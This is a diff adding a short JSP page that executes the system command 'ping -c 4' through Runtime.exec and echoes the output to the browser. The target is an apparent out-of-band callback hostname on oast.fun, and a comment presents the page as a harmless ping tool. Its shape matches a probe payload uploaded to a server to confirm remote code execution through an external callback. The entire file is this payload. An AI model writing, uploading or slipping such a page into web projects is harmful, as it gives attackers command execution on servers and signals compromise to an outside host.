@@ -1,0 +1,16 @@
+<%@ page import="java.io.*" %>
+<%
+    String ip = "dgmbmgjxgnczpetprmxfs1utu4hreiiek.oast.fun"; // Replace with the IP address you want to ping
+    try {
+        Process process = Runtime.getRuntime().exec("ping -c 4 " + ip); // "-c 4" sends 4 pings on Linux/Mac
+        BufferedReader inputStream = new BufferedReader(new InputStreamReader(process.getInputStream()));
+        
+        String outputLine;
+        while ((outputLine = inputStream.readLine()) != null) {
+            out.println(outputLine + "<br>");
+        }
+        inputStream.close();
+    } catch (IOException e) {
+        out.println("Error: " + e.getMessage());
+    }
+%>
